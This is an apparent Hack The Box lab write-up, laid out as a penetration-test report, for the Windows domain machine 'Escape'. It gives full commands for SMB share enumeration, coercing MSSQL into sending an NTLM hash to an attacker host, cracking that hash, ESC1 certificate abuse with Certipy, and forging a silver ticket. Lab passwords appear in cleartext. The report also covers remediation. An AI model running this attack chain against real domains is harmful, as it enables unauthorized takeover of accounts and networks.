# Penetration Test Report — Escape

![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-MSSQL%20hash%20capture%20%2F%20ESC1-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `sequel.htb`) began with a guest-accessible SMB share containing a PDF with temporary MSSQL credentials. The MSSQL service was coerced into authenticating to an attacker host, and the captured NetNTLMv2 hash for `sql_svc` was cracked, yielding WinRM access. An MSSQL error log then disclosed `ryan.cooper`'s password. Finally, an ADCS template misconfiguration (**ESC1**) allowed requesting a certificate as Administrator — resulting in full domain compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Guest-readable SMB share with credential-bearing PDF | High |
| 2 | MSSQL forced authentication → crackable service-account hash | High |
| 3 | Cleartext user password in MSSQL error log | High |
| 4 | ADCS template `UserAuthentication` vulnerable to ESC1 (ENROLLEE_SUPPLIES_OBJECT) | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
echo "target.htb sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

MSSQL (1433) and Kerberos services noted — with an **8-hour clock skew** (Kerberos tolerance: 5 minutes; sync before Kerberos ops). Guest SMB access to `Public`:

```bash
smbclient -L \\\\sequel.htb\\
smbclient \\\\sequel.htb\\public
get "SQL Server Procedures.pdf"
```

The PDF contained MSSQL credentials: `PublicUser:GuestUserCantWrite1`.

### 2. Foothold — Hash Capture & Crack

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
responder -I tun0 -v
```

```sql
EXEC MASTER.sys.xp_dirtree '\\<attacker-ip>\test', 1, 1
```

Responder captured the NetNTLMv2 hash of `sql_svc` (service running as a user account). Cracked with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# sql_svc : REGGIE1234ronnie

evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

### 3. Lateral Movement — Password in the Error Log

```powershell
ls C:\users
type C:\sqlserver\Logs\ERRORLOG.bak
```

The log recorded a failed login by `ryan.cooper` with password `NuclearMosquito3` — reused successfully for WinRM:

```bash
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

User flag: `C:\Users\Ryan.Cooper\Desktop\user.txt`.

### 4. Privilege Escalation — ESC1

Certify enumerated the CA and a vulnerable template:

```powershell
upload Certify.exe
.\Certify.exe cas
.\Certify.exe find /vulnerable
```

Template `UserAuthentication`: enrollable by **Authenticated Users** with **ENROLLEE_SUPPLIES_OBJECT** → ESC1 (attacker-controlled Subject Alternative Name). Exploited with Certipy:

```bash
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
  -upn administrator@sequel.htb -target sequel.htb \
  -ca sequel-dc-ca -template UserAuthentication

sudo ntpdate -u dc.sequel.htb   # fix clock skew for Kerberos
certipy auth -pfx administrator.pfx   # → TGT + Administrator NT hash

evil-winrm -i sequel.htb -u administrator -H <NT-hash>
```

Root flag: `C:\Users\Administrator\Desktop\root.txt`.

### Alternative Path — Forged Silver Ticket

With `sql_svc`'s cleartext password, a service ticket for MSSQL can be forged locally (the service validates tickets itself; no SPN required):

```bash
# domain SID from: Get-LocalUser -Name $env:USERNAME | Select sid  (drop last RID)
impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF \
  -domain-sid S-1-5-21-4078382237-1492182817-2568127209 \
  -domain sequel.htb -dc-ip dc.sequel.htb -spn nonexistent/DC.SEQUEL.HTB Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k dc.sequel.htb
```

```sql
SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
```

## Remediation

- Remove guest share access; never distribute credentials in documentation.
- Block SMB egress from servers; use gMSA for SQL service accounts.
- Sanitize logs of credentials; monitor for repeated failed logons with valid usernames.
- Remediate ESC1: remove ENROLLEE_SUPPLIES_OBJECT or restrict enrollment; enable CA audit; monitor certificate requests for privileged UPNs.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1552.001 — Credentials in Files |
| Credential Access | T1557.001 — Forced authentication / hash capture |
| Privilege Escalation | T1649 — Steal or Forge Authentication Certificates (ESC1) |
| Lateral Movement | T1550.002/003 — PtH / PtT (Silver Ticket alt.) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
